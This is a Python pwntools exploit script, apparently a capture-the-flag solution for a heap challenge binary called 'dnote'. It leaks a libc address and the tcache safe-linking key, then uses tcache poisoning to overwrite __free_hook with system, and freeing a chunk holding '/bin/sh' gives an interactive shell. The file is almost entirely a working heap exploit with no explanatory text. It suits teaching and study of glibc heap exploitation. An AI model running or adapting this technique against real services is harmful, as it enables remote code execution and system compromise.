from pwn import *

exe = context.binary = ELF('./dnote_patched', checksec=False)
libc = ELF('./libc-2.32.so', checksec=False)

if args.LOCAL:
    r = exe.process()
    gdb.attach(r, gdbscript='''
             b*0x00000000004014a6
             c
             c 12
               ''')
else:
    r = remote("")
    
def create(id, size, name = b'/bin/sh\x00'):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'no : ', str(id).encode())
    r.sendlineafter(b'size : ', str(size).encode())
    r.sendlineafter(b'Name : ', name)
    
def choice(choice, id):
    r.sendlineafter(b'>> ', str(choice).encode())
    r.sendlineafter(b'no : ', str(id).encode())

libc_off = 0x1c4d10
    
for i in range(10):
    create(i, 0x80)
    
for i in range(7):
    choice(3, i)
    
choice(3, 8)
choice(3, 7)
create(1, 0x80)
choice(3, 8)
create(1, 0x120)

choice(2, 7)
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc_off
print(hex(libc.address))

choice(2, 0)
key = u32(r.recv(2) + b'\x00'*2)
print(hex(key))

payload = b'a'*136 + p64(0x91) + p64(key ^ libc.sym['__free_hook'])
print(hex(libc.sym['__free_hook']))
create(1, 0x98, payload)

create(1, 0x80)
create(2, 0x80, p64(libc.sym['system']))
choice(3, 1)

r.interactive()